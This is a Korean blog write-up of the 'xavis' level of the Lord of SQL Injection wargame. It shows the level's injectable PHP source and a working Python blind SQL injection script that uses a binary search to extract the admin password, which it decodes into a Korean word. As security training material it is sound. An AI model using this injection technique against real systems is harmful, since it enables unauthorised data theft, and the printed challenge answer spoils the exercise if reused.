---
title: "[Lord of SQL Injection] LoS - xavis 문제풀이"
date: 2018-08-14
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

아 이거 너무 오래 고민했는데 너무 허무하다.
내가 마블 영화에서 젤 좋아하는게 아이언맨이고 그 중에서도 좋아하는게 자비스 캐릭터였는데, 이 문제때문에 싫어질라고 했다.
근데 어찌어찌 풀었는데 나한테 화가난다 ㅋㅋㅋㅋ  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------------------------------------------------------
query : select id from prob_xavis where id='admin' and pw=''
---------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

일단 소스코드는 간단하다.
보면 `regex`랑 `like`은 사용을 못하도록 되어있는데, 그거 외에 `'`, `"`, `=`, `and`, `or`에 필터링이 없다.
그래서 처음엔 그냥 `Blind SQL Injection`인줄 알고 이 전에 사용했었던 소스코드를 가져와 돌려보았다.
그런데 `length`는 `12`라고 나오는데, 막상 `pw`는 `4번째` 문자부터만 찾았다.  

거기다 4번째 문자 ~ 12번째 문자까지가 싹 다 `0`이 나왔다.
뭔가 이상하다 싶어서 `ord`랑 부등호를 사용해서 첫 번째 글자를 대충 손으로 찾아 보았다.
그랬더니 값이 무려 `50000`대가 나왔다.
`hex`로 값을 바꾸어 보니 `0xc6b0`이 나왔는데, 보니까 우리가 일반적으로 사용하는 아스키코드 범위 내의 문자가 아닌 것 같았다.
그래서 원래 소스코드에서 `48 ~ 127`까지 비교하던 값을 `0x0 ~ 0xffff` 즉,  `0 ~ 65536`까지로 바꾸었다.  

첨엔 이렇게 소스코드 짜고 돌리려고 했는데, 생각해보니 최악의 경우 `0 ~ 65536`까지 `12번`을 비교해야 한다.
뭔가 서버가 터질까봐 두려워서 횟수를 줄일 수 있는 방법을 찾다가 갑자기 학교 다닐때 배웠던 `이진 탐색`이 생각났다.
그래서 이 `이진 탐색(Binary Search)` 알고리즘을 사용해서 아래와 같이 소스코드를 구현했다.  

```python
import requests

def testEqual(j, num):
        try:
                query = url + "1' or id='admin' and ord(substr(pw, " + str(j) + ", 1)) = " + str(num) + "%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
        
        if 'Hello admin' in r.text:
                return True
        else:
                return False

def testBigger(j, num):
        try:
                query = url + "1' or id='admin' and ord(substr(pw, " + str(j) + ", 1)) < " + str(num) + "%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
        
        if 'Hello admin' in r.text:
                return True
        else:
                return False

def searchPw(j, start, end):
        if start > end:
                return "None"

        mid = (start + end) / 2

        if testEqual(j, mid):
                return hex(mid)
        elif testBigger(j, mid):
                end = mid - 1
        else:
                start = mid + 1

        return searchPw(j, start, end)
               
flag = "0x"
length = 0

url = "http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
        try:
                query = url + "1' or id='admin' and length(pw)=" + str(i) + "%23"
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'Hello admin' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
        flag += str(searchPw(j, 0, 65535))[2:]
        print "[+] Found ", str(j), "'s pw : ", flag

print "[+] Found password : ", flag
print "[+] End"
```

이 소스코드를 돌리면 결과는 아래와 같이 나온다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  12
[+] Find password
[+] Found  1 's pw :  0xc6b0
[+] Found  2 's pw :  0xc6b0c655
[+] Found  3 's pw :  0xc6b0c655ad73
[+] Found  4 's pw :  0xc6b0c655ad730
[+] Found  5 's pw :  0xc6b0c655ad7300
[+] Found  6 's pw :  0xc6b0c655ad73000
[+] Found  7 's pw :  0xc6b0c655ad730000
[+] Found  8 's pw :  0xc6b0c655ad7300000
[+] Found  9 's pw :  0xc6b0c655ad73000000
[+] Found  10 's pw :  0xc6b0c655ad730000000
[+] Found  11 's pw :  0xc6b0c655ad7300000000
[+] Found  12 's pw :  0xc6b0c655ad73000000000
[+] Found password :  0xc6b0c655ad73000000000
[+] End
```

4번째부터는 `0`이 나오는 걸 보니, 실제로는 3글자인 것 같았다.
여기까진 어렵지 않게 왔는데, 문제는 지금부터였다.
딱봐도 그냥 아스키코드는 아니고 확장 아스키코드인가 싶어서 인터넷을 뒤져서 `Converter`에 돌려 보았었다.
막 다 이상한 문자만 출력 해 주길래 그게 맞는건줄 알고 계속 시도했다.
근데 아무리 해도 안됨ㅋ  

매일매일 뭐가 잘못된건지 뒤져보는데 아무리봐도 모르겠어서 며칠동안 `내가 코드를 잘못짰나`, 아니면 `변환기를 잘못 사용했나` 해서 진짜 사이트 여기저기 돌아다니면서 `Converter`를 사용 했었다.
그러다가 며칠만에 오늘... 이 [사이트](https://www.branah.com/unicode-converter)를 발견했다.
여기 아래 부분에 보면 `Decimal`이라고, 10진수로 값을 입력하는 곳이 있다.
그 칸에 나온 글자 3개의 `hex` 값을 `10진수`로 바꾸어 입력 해 주었다.  

```plain
508645077344403

OR

50864 50773 44403
```

그랬더니 맨 위 칸에 `우왕굳`이라고 나왔다.
ㅋ
결국 한글이었다.
난 그것도 모르고 변환기가 이상한 문자를 주길래 걔인가 해서 며칠동안 걔만 시도했는데 아니었다.
왜 그 사이트에서는 이상한 문자로 준건지를 모르겠다.
`hex`로 입력했을 때랑 `decimal`로 입력했을 때랑 다른 값을 주는건가...?
그럴리가..
어쨌든 왜 제대로 변환이 안됬는지 원인은 모르겠지만, `우왕굳`을 입력 해 주니 며칠간의 삽질을 끝낼 수 있었다.  

```plain
?pw=우왕굳
```

---

```php
----------------------------------------------------------------------------------------
query : select id from prob_xavis where id='admin' and pw='우왕굳'
----------------------------------------------------------------------------------------

Hello admin
XAVIS Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
XAVIS Clear!!
```